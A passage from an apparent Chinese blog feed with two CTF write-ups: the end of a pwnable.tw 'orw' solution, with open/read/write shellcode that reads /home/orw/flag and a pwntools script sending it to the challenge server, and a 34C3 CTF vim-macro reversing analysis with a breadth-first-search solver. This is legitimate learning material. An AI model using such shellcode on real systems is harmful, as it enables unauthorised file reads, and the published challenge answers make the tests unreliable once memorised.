\n\t"</span></span><br><span class="line"><span class="string">"push $0x6c662f77 \n\t"</span></span><br><span class="line"><span class="string">"push $0x726f2f65 \n\t"</span></span><br><span class="line"><span class="string">"push $0x6d6f682f \n\t"</span> </span><br><span class="line"><span class="string">"movl $0x5,%eax \n\t"</span></span><br><span class="line"><span class="string">"movl %esp,%ebx \n\t"</span></span><br><span class="line"><span class="string">"xor %ecx,%ecx \n\t"</span></span><br><span class="line"><span class="string">"xor %edx,%edx \n\t"</span></span><br><span class="line"><span class="string">"int $0x80\n\t"</span></span><br><span class="line">        <span class="string">"mov %eax,%ebx\n\t"</span></span><br><span class="line"><span class="string">"mov %esp,%ecx\n\t"</span></span><br><span class="line"><span class="string">"mov $0x50,%edx\n\t"</span></span><br><span class="line"><span class="string">"movl $0x3,%eax \n\t"</span></span><br><span class="line"><span class="string">"int $0x80 \n\t"</span></span><br><span class="line"><span class="string">"movl $1,%ebx \n\t"</span></span><br><span class="line"><span class="string">"mov %esp,%ecx\n\t"</span></span><br><span class="line"><span class="string">"mov $0x50,%edx\n\t"</span></span><br><span class="line"><span class="string">"movl $0x4,%eax \n\t"</span></span><br><span class="line"><span class="string">"int $0x80 \n\t"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    );  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>代码应该很好理解，通过看linux系统调用表，首先push进去”/home/orw/flag”字符串，eax改为5，ebx是filname，那将esp放入ebx即可，ecx，edx都为0（瞎猜的，没找到实际对应的规则），int 80调用即可。<br>后面的也是一样，只不过文件描述符我们write的时候设置为1即可，为STDOUT_FILENO，为标准输出形式。<br>之后利用ida去查看这段汇编的字节码，写入shellcode即可。python代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line">shellcode = <span class="string">'\x68\x61\x67\x00\x00\x68\x77\x2f\x66\x6c\x68\x65\x2F\x6f\x72\x68\x2F\x68\x6F\x6D\xB8\x05\x00\x00\x00\x89\xE3\x31\xC9\x31\xD2\xCD\x80\x89\xC3\x89\xE1\xBA\x50\x00\x00\x00\xB8\x03\x00\x00\x00\xCD\x80\xBB\x01\x00\x00\x00\x89\xE1\xBA\x50\x00\x00\x00\xB8\x04\x00\x00\x00\xCD\x80'</span></span><br><span class="line">s= remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> s.recv()</span><br><span class="line">s.send(shellcode)</span><br><span class="line"><span class="keyword">print</span> s.recv()</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h3&gt;&lt;p&gt;新手学习就是要多见识，多做题是长见识的好方法，本文将持续更新pwnable.tw的writeup，记录学习二进制的路程。&lt;/p&gt;
&lt;h3 i
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>34c3ctf中vim题目详解</title>
    <link href="https://foyjog.github.io/2018/01/23/34c3ctf%E4%B8%ADvim%E9%A2%98%E7%9B%AE%E8%AF%A6%E8%A7%A3/"/>
    <id>https://foyjog.github.io/2018/01/23/34c3ctf中vim题目详解/</id>
    <published>2018-01-22T16:19:08.000Z</published>
    <updated>2018-07-03T08:17:37.438Z</updated>
    
    <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>这道题目非常的有意思，但也花了我很多时间来求解，题目是利用了vim中的操作来模拟程序的运行，在vim中输入正确的flag，然后再输入GY@”进行flag的验证。这道题目出的非常的有技巧。</p><h3 id="思路流程"><a href="#思路流程" class="headerlink" title="思路流程"></a>思路流程</h3><ol><li>GY@” 这四个命令的意思为：转到最后一行，复制整行，利用执行寄存器命令@”来执行刚才复制的最后一行程序。</li><li><p>最后一行的字符串为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span>Gf2<span class="string">"ayl^f0"</span>cyl<span class="string">"Ayl^fh"</span>Ayl^fj<span class="string">"Ayl^fG"</span>gyl^fk<span class="string">"GylG$FY"</span>Gy3l$F@<span class="string">"hylFh"</span>Hyl260GY@<span class="string">"F10H</span></span><br></pre></td></tr></table></figure></li><li><p>所以我们得分析这些字符所表达的意思，只要分析清楚了，题目就会有思路。</p></li><li><p>以下是对最后四行命令行的解释：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">---------------------------------------------------------------------------<span class="number">-263</span></span><br><span class="line"><span class="number">6</span>G--移动到第<span class="number">6</span>行</span><br><span class="line">f2--向前寻找找到<span class="number">2</span>的位置</span><br><span class="line"><span class="string">"a</span></span><br><span class="line"><span class="string">yl--复制’2‘到a寄存器</span></span><br><span class="line"><span class="string">^</span></span><br><span class="line"><span class="string">f0</span></span><br><span class="line"><span class="string">"</span>c</span><br><span class="line">yl--复制’<span class="number">0</span>‘到c寄存器</span><br><span class="line"><span class="string">"A</span></span><br><span class="line"><span class="string">yl--append’0‘到a寄存器</span></span><br><span class="line"><span class="string">^</span></span><br><span class="line"><span class="string">fh</span></span><br><span class="line"><span class="string">"</span>A</span><br><span class="line">yl--append‘h’到a寄存器</span><br><span class="line">^</span><br><span class="line">fj</span><br><span class="line"><span class="string">"A</span></span><br><span class="line"><span class="string">yl--append'j'到a寄存器 --20hj</span></span><br><span class="line"><span class="string">^</span></span><br><span class="line"><span class="string">fG</span></span><br><span class="line"><span class="string">"</span>g</span><br><span class="line">yl--复制‘G’到g寄存器</span><br><span class="line">^</span><br><span class="line">fk</span><br><span class="line"><span class="string">"G</span></span><br><span class="line"><span class="string">yl--append‘k’到g寄存器--Gk</span></span><br><span class="line"><span class="string">G$--文件末尾</span></span><br><span class="line"><span class="string">FY</span></span><br><span class="line"><span class="string">"</span>G</span><br><span class="line">y3l--append ‘Y@<span class="string">"’ 到g寄存器 -- GkY@"</span></span><br><span class="line">$</span><br><span class="line">F@</span><br><span class="line"><span class="string">"h</span></span><br><span class="line"><span class="string">yl--复制'@'到h寄存器</span></span><br><span class="line"><span class="string">Fh</span></span><br><span class="line"><span class="string">"</span>H</span><br><span class="line">yl--append‘h’到h寄存器--@h</span><br><span class="line"><span class="number">260</span>G</span><br><span class="line">Y@<span class="string">" -- 执行语句--1Gff"</span>dyl<span class="string">"eyl"</span>fyl4G@c<span class="string">"Dyl6G@dhj"</span>Eylj<span class="string">"Fyl1Gfl"</span>Cyl6Gf2<span class="string">"bylF0"</span>Byl261GY@<span class="string">"3c043Bh4Hf5####</span></span><br><span class="line"><span class="string">---------------------------------------------------------------------------260</span></span><br><span class="line"><span class="string">1G</span></span><br><span class="line"><span class="string">ff</span></span><br><span class="line"><span class="string">"</span>d</span><br><span class="line">yl -- 复制‘f’到d寄存器</span><br><span class="line"><span class="string">"e</span></span><br><span class="line"><span class="string">yl -- 复制’f‘到e寄存器</span></span><br><span class="line"><span class="string">"</span>f</span><br><span class="line">yl -- 复制‘f’到f寄存器</span><br><span class="line"><span class="number">4</span>G -- 移动到第四行</span><br><span class="line">@c -- 执行’<span class="number">0</span>‘命令 ，光标停留在第一个字符‘<span class="number">3</span>’ <span class="comment">// 第二次c变成了0l,光标变为4，实现对flag的遍历</span></span><br><span class="line"><span class="string">"D</span></span><br><span class="line"><span class="string">yl -- append‘3’到d寄存器 -- f3</span></span><br><span class="line"><span class="string">6G -- 到第6行</span></span><br><span class="line"><span class="string">@d -- 执行‘f3‘命令</span></span><br><span class="line"><span class="string">hj -- 左移，下移到','字符</span></span><br><span class="line"><span class="string">"</span>E </span><br><span class="line">yl -- append’,‘到e寄存器 f,</span><br><span class="line">j  -- 下移到’G‘字符</span><br><span class="line"><span class="string">"F </span></span><br><span class="line"><span class="string">yl -- append’G‘到f寄存器 -- fG</span></span><br><span class="line"><span class="string">1G </span></span><br><span class="line"><span class="string">fl</span></span><br><span class="line"><span class="string">"</span>C</span><br><span class="line">yl -- append’l‘到c寄存器 -- <span class="number">0l</span></span><br><span class="line"><span class="number">6</span>G -- 移动到第<span class="number">6</span>行</span><br><span class="line">f2</span><br><span class="line"><span class="string">"b </span></span><br><span class="line"><span class="string">yl -- 复制2到b寄存器</span></span><br><span class="line"><span class="string">F0 </span></span><br><span class="line"><span class="string">"</span>B</span><br><span class="line">yl -- append’<span class="number">0</span>‘到b寄存器 -- <span class="number">20</span></span><br><span class="line"><span class="number">261</span>G</span><br><span class="line">Y@<span class="string">"--执行语句--9G@e19l@a"</span>Byt<span class="number">.6</span>Gfj<span class="string">"Byl6Gf2"</span>aylF0<span class="string">"Ayl9G@f19l@b"</span>Ayt<span class="number">.6</span>Gfj<span class="string">"Ayl40|@a260GY@"</span>@<span class="number">1f</span>Bkya5B^</span><br><span class="line">-----------------------------------------------------------<span class="number">-261</span></span><br><span class="line"><span class="number">9</span>G</span><br><span class="line">@e  --寻找flag左移下移的字符</span><br><span class="line"><span class="number">19l</span> --右移<span class="number">19</span>为到字符c</span><br><span class="line">@a  --执行<span class="number">20</span>hj到第十行h字符 -- a   寄存器作为<span class="number">20</span>?xxj的操作符</span><br><span class="line"><span class="string">"B</span></span><br><span class="line"><span class="string">yt. -- append"</span>h33<span class="string">"到b寄存器--20h33</span></span><br><span class="line"><span class="string">6G </span></span><br><span class="line"><span class="string">fj</span></span><br><span class="line"><span class="string">"</span>B</span><br><span class="line">yl  -- append<span class="string">"j"</span>到b寄存器-<span class="number">-20</span>h33j --  b寄存器作为<span class="number">20</span>?xxj的操作符</span><br><span class="line"><span class="number">6</span>G</span><br><span class="line">f2</span><br><span class="line"><span class="string">"a  </span></span><br><span class="line"><span class="string">yl  --清空a后将’2‘放入a寄存器</span></span><br><span class="line"><span class="string">F0</span></span><br><span class="line"><span class="string">"</span>A</span><br><span class="line">yl -- append’<span class="number">0</span>‘放入寄存器a -- <span class="number">20</span></span><br><span class="line"><span class="number">9</span>G</span><br><span class="line">@f --执行fG命令 </span><br><span class="line"><span class="number">19l</span> -- 光标指向第九行的k字符</span><br><span class="line">@b --执行<span class="number">20</span>h33j ,光标指向<span class="number">42</span>行h字符</span><br><span class="line"><span class="string">"A </span></span><br><span class="line"><span class="string">yt. --append“h103”到a寄存器20h103</span></span><br><span class="line"><span class="string">6G</span></span><br><span class="line"><span class="string">fj -- 第六行j字符</span></span><br><span class="line"><span class="string">"</span>A</span><br><span class="line">yl -- append“h30”到a寄存器<span class="number">20</span>h103j</span><br><span class="line"><span class="number">40</span>| -- 光标移动到第<span class="number">6</span>行的第<span class="number">40</span>个字符处</span><br><span class="line">@a -- 执行<span class="number">20</span>h103j,移动到<span class="number">36</span>行E字符</span><br><span class="line"><span class="number">260</span>G</span><br><span class="line">Y@<span class="string">"--执行260G</span></span><br><span class="line"><span class="string">@1</span></span><br><span class="line"><span class="string">fB</span></span><br><span class="line"><span class="string">kya5B^</span></span><br><span class="line"><span class="string">------------------------------------------------------------262</span></span><br><span class="line"><span class="string">6G</span></span><br><span class="line"><span class="string">rwl</span></span><br><span class="line"><span class="string">ril</span></span><br><span class="line"><span class="string">rnl</span></span><br><span class="line"><span class="string">r!l</span></span><br><span class="line"><span class="string">d$ </span></span><br><span class="line"><span class="string">jdG --删除掉第六行之后所有数据，只留下win!的标志</span></span><br><span class="line"><span class="string">@h</span></span><br><span class="line"><span class="string">####!E</span></span><br><span class="line"><span class="string">dG</span></span><br><span class="line"><span class="string">G8E4f$5F15rdh3n839.l7gfiC$####HgBll8h^aHBFE"</span>kBHn71^<span class="number">2</span>gcj.c</span><br><span class="line">---</span><br></pre></td></tr></table></figure></li><li><p>260 这一行做的是对d e f寄存器做fx的查找初始化操作，同时对c寄存器做+1操作，对b寄存器做20初始化</p></li><li>261这一行做的是通过e，f寄存器的查找操作和19l+a的移动操作对b进行初始化和+b的移动操作对a进行初始化</li><li>可以分析出262行为重点，只要执行了262行，就代表flag正确，而我们从263行对g寄存器的数值GkY@”的意思可以看到263 k 到 262行，然后执行，所有只要执行了@g，那么我们就成功了。在108行我们发现了@g这个字段，所以只要让a寄存器调到@g这个字段，那么就能成功的得到答案。</li></ol><p>现在对整个程序的执行进行一个整理：</p><ol><li>利用c寄存器对flag进行遍历，每次得到一个字符，在第6行中找到该字符，然后下移到第七行，左移一个字符，得到字符m，下移，得到字符n。</li><li>在第九行找到字符m，利用@a命令+19l命令得到一个新的操作运算符。并赋给b寄存器</li><li>在第九行找到字符n，利用@b命令+19l命令得到一个新的操作运算符，并赋给a寄存器</li><li>执行a寄存器，返回1循环。</li></ol><p>上述所讲的操作运算符的意思是l250,l35之类的，程序通过控制第7-9行字符，导致执行@a或者b命令的时候总是会得到一个新的操作运算符。并将其填入b或者a寄存器。</p><p>那么我们如何去找到一串字符串是的a寄存器变成@g该运算符呢？我刚开始一直在通过@g往前推可能的字符串，但是结果不是很好，利用深度遍历，并没有发现想要的字符串，后来转换了思路，从前往后遍历，从深度换成广度，换来换去一直没有结果，后来才发现自己在操作运算符方面的路径出错了，所以改正过来，并且利用从前往后的广度遍历得到了答案。</p><p><img src="/img/1801231.jpg" alt="我是图片"></p><p>python脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line">sys.setrecursionlimit(<span class="number">1000000</span>)<span class="comment">####设置递归的超出次数</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VimOperateWithChar</span><span class="params">(object)</span>:</span><span class="comment">####该类主要是为了路径而设</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, vim, char)</span>:</span></span><br><span class="line">        self.vim = vim</span><br><span class="line">        self.char = char</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VimOperate</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, operate, number,i,j)</span>:</span></span><br><span class="line">        self.operate = operate</span><br><span class="line">        self.number = number</span><br><span class="line">        self.i = i</span><br><span class="line">        self.j = j</span><br><span class="line">        self.ref = []       </span><br><span class="line">        self.qued = <span class="number">0</span></span><br><span class="line">        self.front = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">InitRef</span><span class="params">()</span>:</span><span class="comment">####时间花在初始化上面，70*4000个操作符需要一定的时间</span></span><br><span class="line">    search_char1 = <span class="string">''</span></span><br><span class="line">    search_char2 = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> vio <span class="keyword">in</span> vimArr:       </span><br><span class="line">         <span class="keyword">for</span> c <span class="keyword">in</span> flag_single:</span><br><span class="line">            search_char1 =  flag_str_search1[flag_str.find(c)<span class="number">-1</span>]</span><br><span class="line">            search_char2 =  flag_str_search2[flag_str.find(c)<span class="number">-1</span>]</span><br><span class="line">            line_9_char1_index = flag_str_search12.find(search_char1)</span><br><span class="line">            <span class="keyword">if</span> vio.number != <span class="string">'g'</span>: </span><br><span class="line">                <span class="keyword">if</span> vio.operate == <span class="string">'h'</span>:</span><br><span class="line">                    b = GetVimOFromArr(int(vio.number),int(line_9_char1_index - <span class="number">1</span>)/<span class="number">5</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    b = GetVimOFromArr(int(vio.number),int(line_9_char1_index +<span class="number">39</span>)/<span class="number">5</span>)</span><br><span class="line">                <span class="keyword">if</span> b.number != <span class="string">'g'</span>:</span><br><span class="line">                    line_9_char2_index = flag_str_search12.find(search_char2)           </span><br><span class="line">                    <span class="keyword">if</span> b.operate == <span class="string">'h'</span>:</span><br><span class="line">                        a = GetVimOFromArr(int(b.number),int(line_9_char2_index - <span class="number">1</span>)/<span class="number">5</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        a = GetVimOFromArr(int(b.number),int(line_9_char2_index +<span class="number">39</span>)/<span class="number">5</span>)</span><br><span class="line">                    vio.ref.append(VimOperateWithChar(a,c))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetVimOFromArr</span><span class="params">(i,j)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> vio <span class="keyword">in</span> vimArr:</span><br><span class="line">        <span class="keyword">if</span>(vio.i == i <span class="keyword">and</span> vio.j == j):</span><br><span class="line">            <span class="keyword">return</span> vio</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Traverse</span><span class="params">(root,dest)</span>:</span><span class="comment">####利用队列进行广度优先遍历</span></span><br><span class="line">    <span class="keyword">global</span> vio2</span><br><span class="line">    root.qued = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> viow <span class="keyword">in</span> root.ref:        </span><br><span class="line">        <span class="keyword">if</span> viow.vim.qued == <span class="number">0</span>:</span><br><span class="line">            viow.vim.front = VimOperateWithChar(root,viow.char)</span><br><span class="line">            <span class="keyword">if</span> viow.vim == dest:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"success!"</span></span><br><span class="line">                q.put(root)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                viow.vim.qued = <span class="number">1</span></span><br><span class="line">                q.put(viow.vim)</span><br><span class="line">    Traverse(q.get(),dest)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q = Queue.Queue()         </span><br><span class="line">vimArr = []</span><br><span class="line">vim = open(<span class="string">"F://ctf//34c3ctf//vim//vim-5ca46d1e8afdc0b30b25fdf8f69f868b33a16241.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line">vim.seek(<span class="number">10</span>,<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">5</span>):    </span><br><span class="line">    vim.readline()</span><br><span class="line">flag_str =  vim.readline()</span><br><span class="line">flag_single = list(set(flag_str))</span><br><span class="line">flag_single.remove(<span class="string">'\n'</span>)</span><br><span class="line">flag_single.remove(<span class="string">'@'</span>)</span><br><span class="line">flag_single.remove(<span class="string">'"'</span>)</span><br><span class="line">flag_str_search1 = vim.readline()</span><br><span class="line">flag_str_search2 = vim.readline()</span><br><span class="line">flag_str_search12 = vim.readline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">251</span>):</span><br><span class="line">    strline = vim.readline()   </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">if</span> strline[j*<span class="number">5</span>+<span class="number">2</span>] == <span class="string">'.'</span>:</span><br><span class="line">            number = strline[j*<span class="number">5</span>+<span class="number">1</span>:j*<span class="number">5</span>+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">elif</span> strline[j*<span class="number">5</span>+<span class="number">3</span>] == <span class="string">'.'</span>:</span><br><span class="line">            number = strline[j*<span class="number">5</span>+<span class="number">1</span>:j*<span class="number">5</span>+<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">elif</span> strline[j*<span class="number">5</span>+<span class="number">4</span>] == <span class="string">'.'</span>:</span><br><span class="line">            number = strline[j*<span class="number">5</span>+<span class="number">1</span>:j*<span class="number">5</span>+<span class="number">4</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">             number = strline[j*<span class="number">5</span>+<span class="number">1</span>:j*<span class="number">5</span>+<span class="number">5</span>]</span><br><span class="line">        vio = VimOperate(strline[j*<span class="number">5</span>:j*<span class="number">5</span>+<span class="number">1</span>],number,i,j) </span><br><span class="line">        vimArr.append(vio)</span><br><span class="line"></span><br><span class="line">InitRef()     </span><br><span class="line"></span><br><span class="line">root = GetVimOFromArr(<span class="number">12</span>,<span class="number">13</span>)<span class="comment">####12，13是"20l48j"是题目运行完“34C3_”字符串之后得到的</span></span><br><span class="line">dest = GetVimOFromArr(<span class="number">99</span>,<span class="number">0</span>)</span><br><span class="line">Traverse(root,dest)<span class="comment">####广度遍历</span></span><br><span class="line"></span><br><span class="line">flag =<span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> dest.front.vim != root:</span><br><span class="line">    flag += dest.front.char</span><br><span class="line">    dest = dest.front.vim</span><br><span class="line">flag += dest.front.char</span><br><span class="line"><span class="keyword">print</span> <span class="string">"34C3_"</span>+flag[::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure></p><p>题目的链接为：<a href="https://pan.baidu.com/s/1kWhqIOn" target="_blank" rel="noopener">https://pan.baidu.com/s/1kWhqIOn</a> 密码：ifzs</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h3&gt;&lt;p&gt;这道题目非常的有意思，但也花了我很多时间来求解，题目是利用了vim中的操作来模拟程序的运行，在vim中输入正确的flag，然后再输入GY@”
      
    
    </summary>
    
    
  </entry>
  
</feed>
